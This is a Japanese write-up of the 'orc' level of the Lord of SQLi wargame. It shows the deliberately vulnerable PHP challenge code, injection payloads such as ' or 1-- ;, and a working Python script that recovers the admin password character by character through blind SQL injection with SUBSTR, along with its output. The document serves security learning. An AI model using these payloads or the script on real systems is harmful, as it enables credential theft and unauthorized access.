# orc

## answer

- [orc](../src/orc.py)

## problem

```
query : select id from prob_orc where id='admin' and pw=''

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

## memo

試しに、

```
https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=aa
```

とすると

```
query : select id from prob_orc where id='admin' and pw='aa'
```

となった。
コードを読んでいく。

```addslashes```関数はエスケープすべき文字の前にバックスラッシュをつけて返す。
エスケープすべき文字とは、以下のとおり

- シングルクォート (')
- ダブルクォート (")
- バックスラッシュ (\\)
- NUL (NULL バイト)

```
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
```

とあるが、これはsqlの結果を返し、パスワードが一致しないといけないということ。

方針としては、BlindSQLiのつもりでいく。

```
https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=' or 1-- ;
```

これが、

```
query : select id from prob_orc where id='admin' and pw='' or 1-- ;'
```

となり、```Hello admin```を誘発させるので、やっぱりBlindSQLi可能。
その次重要になるのはどうpasswordを抜いていくか。
コード見た感じSUBSTRとかは使えそう？

```
https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=' or substr(pw,1,1)='a' and id = 'admin' -- ;
```

これでpasswordの一文字目がaじゃないってことが分かるって寸法。

じゃあコードかいていくぜ

```
#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"
    ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
    headers = {'User-Agent': ua}
    cookies = dict(PHPSESSID='XXXXXXXXXXXXXXXXXXXXX')

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    password = ""
    for count in range(1, 10):
        for char in chars:
            print("  " + char)
            val = '\' or SUBSTR(pw,{count},1)=\'{char}\' and id = \'admin\' -- ;'.format(count = count, char = char)
            params = {'pw': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello admin") == 1:
                password += char
                print(password)
                break
            if char == 'Z':
                return
    print(password)

if __name__ == "__main__":
    main()
```

```
$ python3 code/orc.py 
2
29
295
295d
295d5
295d58
295d584
295d584
```

## supplementary

先にパスワードの長さを取得するのもスタンダードらしいっす。

```
?pw=' or length(pw)=8 -- ;
```

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [addslashes | php manual](https://www.php.net/manual/ja/function.addslashes.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)